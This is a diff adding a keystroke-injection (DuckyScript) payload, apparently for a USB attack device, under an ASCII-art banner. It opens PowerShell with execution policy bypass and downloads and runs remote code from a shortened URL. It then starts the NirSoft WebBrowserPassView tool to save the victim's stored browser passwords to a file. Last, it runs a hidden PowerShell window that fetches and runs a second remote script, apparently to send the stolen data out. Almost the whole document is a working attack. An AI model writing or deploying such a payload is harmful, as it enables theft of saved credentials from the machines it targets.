@@ -1,0 +1,54 @@
+REM Title: W1ns1d3r_st4gg3d_Tr3ll0
+REM Author: 
+REM
+REM ______________________________________________________________________________________________
+REM 
+REM 888      d888                             888          d8888                            d8888  
+REM 888     d8888                             888         d8P888                           d8P888  
+REM 888       888                             888        d8P 888                          d8P 888  
+REM 88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
+REM 888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
+REM 888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
+REM 888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
+REM 88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
+REM                     888          888                                                           
+REM                Y8b d88P          888                                                           
+REM                 "Y88P"           888                                                           
+REM ______________________________________________________________________________________________
+REM
+REM
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoP -Ep Bypass
+ENTER
+DELAY 1000
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://shorturl.at/'))
+ENTER
+DELAY 1500
+STRING TempDir
+ENTER
+DELAY 300
+STRING Get-Nirsoft
+ENTER
+DELAY 8000
+STRING wbpv28821@
+ENTER
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 6000
+CTRL A
+CTRL S
+DELAY 1000
+STRING w3b_br0ws3r_p4ssw0rds
+ENTER
+DELAY 1000
+ALT F4
+DELAY 1500
+STRING exit
+ENTER
+DELAY 600
+GUI r
+DELAY 1000
+STRING powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/ | iex
+ENTER
